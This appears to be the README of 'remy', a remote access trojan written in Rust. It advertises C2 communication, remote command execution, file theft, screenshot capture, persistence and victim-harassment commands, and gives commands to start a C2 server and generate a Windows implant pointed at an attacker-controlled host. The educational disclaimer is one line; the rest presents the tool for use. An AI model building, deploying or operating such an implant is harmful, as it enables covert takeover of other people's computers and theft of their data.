<p align="center">
<img src="remy-logo.png" width="300">
</p>

# remy

A simple remote access trojan (RAT) written in Rust.

## :exclamation: Warning :exclamation:

This project is _strictly for educational/research purposes_, any malicious activities that involve use of this repository is not the responsibility of the owner.
**:zap: Ignore at your own risk! :zap:**

## Features

- [x] HTTP-based C2 communication
- [x] Cross-platform (Windows/Linux)
- [x] Command execution
- [x] File upload/download
- [x] Screenshot capture
- [x] Persistence mechanisms
- [x] Encrypted communications (AES-256-GCM)
- [x] Web UI dashboard
- [x] Troll commands (rickroll, speak, popup, wallpaper, mouse_chaos)

## Building

```bash
cargo build --release
```

## Usage

```bash
# Start the C2 server
remy server -p 8080

# Build a client payload
remy generate --os windows --c2 http://your-server:8080
```

## Architecture

```
remy/
├── src/
│   ├── main.rs
│   ├── server/       # C2 server
│   ├── client/       # Implant/payload
│   ├── crypto/       # Encryption
│   └── commands/     # Available commands
└── Cargo.toml
```

## License :scroll:

This project is licensed under the MIT License. See [LICENSE](LICENSE) for more information.
